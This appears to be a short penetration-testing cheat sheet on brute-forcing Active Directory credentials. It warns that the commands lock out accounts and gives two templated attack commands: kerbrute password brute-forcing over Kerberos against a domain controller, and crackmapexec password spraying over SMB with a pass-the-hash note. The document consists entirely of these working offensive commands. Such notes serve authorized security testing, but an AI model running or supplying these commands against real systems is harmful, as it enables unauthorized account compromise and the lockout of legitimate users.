# Brute-forcing
WILL LOCKOUT USER:
```bash
# Kerberos
kerbrute bruteuser --dc <IP> -d '<DOMAIN>' <PASSLIST> '<USER>'

# SMB
crackmapexec smb <IP> -u '<USER>' -p <PASSLIST> # PTH
```